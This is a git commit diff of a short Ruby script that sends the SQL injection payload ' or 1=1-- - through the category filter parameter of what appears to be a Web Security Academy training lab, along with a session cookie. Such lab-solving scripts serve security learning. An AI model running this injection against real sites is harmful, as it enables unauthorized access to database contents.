acfab633b45c526ab66b36132288960d919d92f9
A3h1nt <56585189+A3h1nt@users.noreply.github.com>
2025-04-10 11:48:35 +0530

    Update sql-1.rb

--- SQL/sql-1.rb
+++ SQL/sql-1.rb
@@ -1,15 +1,15 @@
 require 'http'
 
-payload = URI.encode_uri_component("' or 1=1-- -")
+payload = "' or 1=1-- -"
 
-url = "https://0a1b00a203d6cd6e8141ed17006a0081.web-security-academy.net/filter?category=Gifts#{payload}"
+url = "https://0a6e003d030f3860805b12230041007b.web-security-academy.net/filter"
 
 client = HTTP.headers(
 	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
 	)
 	.cookies(
-		:session => "MKLKEyIa910QbecVESp1hmuHIpJ0U1A8"
+		:session => "N76DL7Bb7zq3OvI0rt4ekIPdKN9d8eBX"
 	)
 
-resp = client.get url
-puts resp.body.to_s
+resp = client.get url,:params => {:category => "Gifts#{payload}"}
+puts resp.code
